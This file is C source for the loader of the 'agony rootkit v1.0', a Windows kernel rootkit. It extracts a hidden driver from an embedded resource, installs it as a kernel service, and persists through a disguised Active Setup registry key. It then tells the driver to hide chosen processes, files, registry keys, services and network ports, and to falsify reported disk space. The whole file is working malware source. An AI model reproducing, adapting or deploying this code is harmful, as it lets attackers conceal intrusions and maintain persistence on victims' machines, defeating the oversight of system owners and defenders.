#include <windows.h>
#include <stdio.h>
#include <ddk/ntddk.h>
#include "..\sys\codemsg.h"
//#include "sysfile.rc"

#define DEVICE "agony"
#define SYSFILE "agony.sys"
#define RESSOURCENAME "agony"
#define SERVICENAME "agony"
#define SPACEFILENAME "VOLUME.INI"
#define LSPACEFILENAME L"VOLUME.INI"

#define PATH_KEY "Software\\Microsoft\\Active Setup\\Installed Components"
#define NAME_KEY1 "{232f4e3f2-bab8-11d0-97b9-00c04f98bcb9}"
#define NAME_KEY2 "{256dc5e0e-7c46-11d3-b5bf-0000f8695621}"

int FileExists( const char * FileName )
{
    return GetFileAttributes(FileName)!=0xFFFFFFFF;
}

void usage( char *p )
{
   printf("   agony rootkit v1.0\n\n");
   printf("%s -p process.exe     : hide the process\n",p);    
   printf("%s -f fichier/dossier : hide the file\n",p);
   printf("%s -k cle             : hide the reg key\n",p);
   printf("%s -v valeur          : hide the reg value\n",p);
   printf("%s -tcp port          : hide the TCP port\n",p);
   printf("%s -udp port          : hide the UDP port\n",p);
   printf("%s -s service         : hide the service\n",p);
   printf("%s -space C:X         : add X MB to available space on volume C\n",p);
   printf("%s -r                 : survive to reboot (with all option in this cmdline)\n",p);
   printf("%s -stop              : stop and uninstall rootkit\n",p);
   printf("%s -h                 : more help\n",p);
}

// Extraction of the ressource driver
// taken and modified from rootkit.com 
BOOL ExtractSysFile()
{
      HRSRC aResourceH;
      HGLOBAL aResourceHGlobal;
      unsigned char * aFilePtr;
      unsigned long aFileSize;
      HANDLE file_handle;
      char _filename[64];

      aResourceH = FindResource(NULL, RESSOURCENAME, "BITMAP");

      if(!aResourceH) {
            printf("cannot find ressource\n");
            return FALSE;
      }
      aResourceHGlobal = LoadResource(NULL, aResourceH);

      if(!aResourceHGlobal) {
            printf("cannot load ressource\n");
            return FALSE;
      }
     
      aFileSize = SizeofResource(NULL, aResourceH);
      aFilePtr = (unsigned char *)LockResource(aResourceHGlobal);

      if(!aFilePtr) {
            printf("cannot lock ressource into memory\n");        
            return FALSE;
      }
      snprintf(_filename, 62, "%s.sys", RESSOURCENAME);

      file_handle = CreateFile(_filename, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
                               
      if(INVALID_HANDLE_VALUE == file_handle) {
            int err = GetLastError();
            if( (ERROR_ALREADY_EXISTS == err) || (32 == err)) {
                  // no worries, file exists and may be locked
                  // due to exe
                  return TRUE;
            }
            printf("decompression error %s: %d\n", _filename, err);
            return FALSE;
      }

      // While loop to write resource to disk
      while(aFileSize--) {
            unsigned long numWritten;
            WriteFile(file_handle, aFilePtr, 1, &numWritten, NULL);
            aFilePtr++;
      }
      CloseHandle(file_handle);
      return TRUE;
}

void fix(char *args, BOOL install)
{  
    // ActiveX startup 
    char cmdline[MAX_PATH];
    char pathkey1[MAX_PATH];
    char pathkey2[MAX_PATH];
    char *pathkey = pathkey1;
    char *namekey = NAME_KEY1;
    HKEY hKey, hKey2; 
    DWORD Action;
    
    SECURITY_ATTRIBUTES SecAtt;
	SecAtt.nLength = sizeof (SECURITY_ATTRIBUTES);
	SecAtt.lpSecurityDescriptor = NULL;
	SecAtt.bInheritHandle = TRUE;
	
	// 2 possible path in ActiveX key
	pathkey1[0] = '\0';
    strcat( pathkey1, PATH_KEY );
    strcat( pathkey1, "\\");
    strcat( pathkey1, NAME_KEY1 );
    pathkey2[0] = '\0';
    strcat( pathkey2, PATH_KEY );
    strcat( pathkey2, "\\");
    strcat( pathkey2, NAME_KEY2 );
    
    if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, pathkey2,0,KEY_READ,&hKey) == ERROR_SUCCESS ) {
       // the last key used was the 2, now use the 1
       pathkey = pathkey1;
       namekey = NAME_KEY1;  
       RegCloseKey( hKey ); 
    }   
    if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, pathkey1,0,KEY_READ,&hKey) == ERROR_SUCCESS ) {
       // last was the 1, now use the 2 
       pathkey = pathkey2;
       namekey = NAME_KEY2;
       RegCloseKey( hKey );
    }   
    
    // delete old keys
    RegDeleteKey(HKEY_LOCAL_MACHINE, pathkey1);
    RegDeleteKey(HKEY_LOCAL_MACHINE, pathkey2);
    RegDeleteKey(HKEY_CURRENT_USER, pathkey1);
    RegDeleteKey(HKEY_CURRENT_USER, pathkey2);
     
    if( install ) {
       GetModuleFileName(NULL,cmdline,MAX_PATH);
       if( args != NULL )
          strcat( cmdline, args );
        
       RegOpenKeyEx(HKEY_LOCAL_MACHINE, PATH_KEY, 0, KEY_ALL_ACCESS, &hKey); 
       RegCreateKeyEx(hKey, namekey,0,NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, &SecAtt, &hKey2, &Action);
       RegSetValueEx(hKey2, "StubPath", 0, REG_SZ, cmdline, strlen(cmdline));   
       RegCloseKey(hKey2);  
       RegCloseKey(hKey);   
    }    
}

BOOL CreateSpaceFile( char DriveLetter, unsigned long space )
{
  HANDLE hFile;   
  char buffer[256];
  DWORD written;
  BOOL ret = TRUE;
  
  sprintf(buffer, "%c:\\%s", DriveLetter, SPACEFILENAME);         
     
  hFile = CreateFile( 
      buffer,
      GENERIC_WRITE | GENERIC_READ,
      FILE_SHARE_READ | FILE_SHARE_WRITE,
      NULL,                // no security attributes
      CREATE_ALWAYS,       // overwrite if exist
      FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
      NULL);
  
  if( hFile == INVALID_HANDLE_VALUE ) 
     return FALSE;
     
  SetFilePointer( hFile, 0, NULL, FILE_BEGIN);   
  ret = WriteFile( hFile, &space, sizeof(unsigned long), &written, NULL);
  
  CloseHandle( hFile );
  return ret;   
}

void DeleteAllSpaceFiles()
{
   char buffer[256];
   char buf[256];
   char *LogicalDrive = buf;
   
   memset( buf, '\0', sizeof(buf) );
   GetLogicalDriveStrings(sizeof(buf), buf);   
   
   while(strlen(LogicalDrive))  {
       memset(buffer, '\0', sizeof(buffer));
	   
	   switch( GetDriveType( LogicalDrive ) )
	   { 
          case DRIVE_FIXED:
	      case DRIVE_REMOTE:
	      case DRIVE_RAMDISK:
                 sprintf(buffer, "%c:\\%s", LogicalDrive[0], SPACEFILENAME);
                 if( FileExists( buffer ))
                    DeleteFile( buffer );        
       }

	   LogicalDrive += strlen(LogicalDrive)+1;
   }   
}

int main(int argc,char **argv)
{
  HANDLE SCManager = 0; 
  HANDLE service = 0;
  HANDLE device = 0;
  SERVICE_STATUS status;
  int i=1,j;
  char sysfilepath[256];
  char devicepath[256];
  char ret[1024];
  WCHAR ToSend[512];
  DWORD code, bytes;
  char DriveLetter;
  unsigned short port;
  unsigned long space;
  
  if( argc<2 ) {
     usage(argv[0]);
     return 0;
  }
  
  // get sysfile path
  GetCurrentDirectory(sizeof(sysfilepath), sysfilepath);
  strcat( sysfilepath, "\\\\" );
  strcat( sysfilepath, SYSFILE );
  
  if( !FileExists( sysfilepath ) && strcmp(argv[1],"-stop")  && strcmp(argv[1],"-h") ) {
      printf("extracting .sys...\n");
      if( !ExtractSysFile() ) {
        printf("cannot extract sys file...\n");
        return 0;
      }  
  }

  // MultiByteToWideChar(CP_ACP, 0, argv[4], -1, ToSend, sizeof(ToSend));
  
  SCManager = OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
  if(SCManager) {
     service = CreateService(SCManager, SERVICENAME, SERVICENAME, SERVICE_ALL_ACCESS,
             SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,
             sysfilepath, NULL,NULL,NULL,NULL,NULL);

     if(!service) // if we cannot create it, maybe he is already existing 
        service = OpenService(SCManager,SERVICENAME, SERVICE_ALL_ACCESS);
     
     if(service)    
        StartService(service, 0, NULL);
     else
        printf("cannot create/open the service\n");   
  }   
  else 
     printf("cannot open the service manager\n");  
   
  sprintf(devicepath,"\\\\.\\Global\\%s\0",DEVICE); 
  device = CreateFile(devicepath,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
  
  if( !device || device==INVALID_HANDLE_VALUE ) {   
     printf("cannot communicate with the driver.\n");
     CloseServiceHandle(service);
     CloseServiceHandle(SCManager);
     return 0; 
  }
   
  if( !strcmp(argv[1], "-stop")) {
     // stop & uninstall service
     
     // clean startup reg keys
     fix( NULL, FALSE );
     
     // delete VOLUME.INI files
     DeleteAllSpaceFiles();
     
     if( device ) 
        CloseHandle( device );

     if( service ) {   
        ControlService(service, SERVICE_CONTROL_STOP,&status);
        DeleteService(service);
        CloseServiceHandle(service);
     }
     
     if( SCManager )
        CloseServiceHandle(SCManager);
     return 0;
  }  
  
  if( !strcmp(argv[1], "-h")) {
     printf("all options \"cumulables\" in a same command line\n");
     printf("for exemple: agony -p process1.exe process2.exe will hide 2 process\n");
     printf("we can accumulate different options on a same line:\n");
     printf("%s -p process.exe process2.exe -s service1 -f process1.exe process2.exe\n",argv[0]);
     printf("we can also choose to launch our command one by one\n\n");
     printf("for the -space option, the syntax is:\n");
     printf("%s -space volume_letter:space_to_hide_in_MB\n",argv[0]);
     printf("we can cumulate for option -space, like other options:\n");
     printf("%s -space C:5000 D:1000 F:5500\n",argv[0]);
     return 0;   
  }   
    
  code = NO_MSG;  
    
  while( i < argc ) { 
     if( !strcmp(argv[i],"-p") ) {
        code = PROCESS_CODE;  
        i++; continue;
     }
     if( !strcmp(argv[i],"-f") ) { 
        code = FILE_CODE;    
        i++; continue;
     }   
     if( !strcmp( argv[i], "-k" ) ) {
        code = REGKEY_CODE;        
        i++; continue;
     }       
     if( !strcmp( argv[i], "-v" ) ) {
        code = REGVALUE_CODE;  
        i++; continue;
     } 
     if( !strcmp( argv[i], "-s" ) ) {
        code = SERVICE_CODE;  
        i++; continue;
     }  
     if( !strcmp( argv[i], "-tcp" ) ) {
        code = TCP_PORT_CODE;  
        i++; continue;
     }   
     if( !strcmp( argv[i], "-udp" ) ) {
        code = UDP_PORT_CODE;  
        i++; continue;
     }  
     if( !strcmp( argv[i], "-space" ) ) {
        code = DISK_SPACE_CODE;  
        i++; continue;
     }  
     if( !strcmp( argv[i], "-r" ) ) {
        // we get the initial cmdline
        ret[0] = '\0'; 
        for(j=1; j<argc; j++) {
           strcat(ret, " ");       
           strcat(ret, argv[j]);           
        }          
        fix(ret, TRUE); 
        i++; continue;
     } 
     
     
     if( code == DISK_SPACE_CODE ) {
        DriveLetter = argv[i][0];
        space = atoi( argv[i]+2 );
        if(!CreateSpaceFile(DriveLetter,space))
           printf("volume %c space will not be falsificated\n", DriveLetter);   
        // we launch the hook and we hide the VOLUME.INI file
        DeviceIoControl(device, CODEMSG(DISK_SPACE_CODE), LSPACEFILENAME, sizeof(LSPACEFILENAME), 
                                       &ret, sizeof(ret),&bytes,NULL); 
        DeviceIoControl(device, CODEMSG(FILE_CODE), LSPACEFILENAME, sizeof(LSPACEFILENAME), 
                                       &ret, sizeof(ret),&bytes,NULL);  
     }
     else if( code == TCP_PORT_CODE || code == UDP_PORT_CODE ) {
        port = atoi( argv[i] );
        DeviceIoControl(device, CODEMSG(code), &port, sizeof(port), 
                                       &ret, sizeof(ret),&bytes,NULL);
     }  
     else {
        // convert the arg to wide char before sending
        MultiByteToWideChar(CP_ACP, 0, argv[i], -1, ToSend, sizeof(ToSend));
        DeviceIoControl(device, CODEMSG(code), ToSend, (wcslen(ToSend)+1)*2, 
                                       &ret, sizeof(ret),&bytes,NULL);
     }                                  
     i++;
  }
  
  CloseHandle( device );
  if( service )
     CloseServiceHandle(service);
  if( SCManager )
     CloseServiceHandle(SCManager);
  return 0;
}
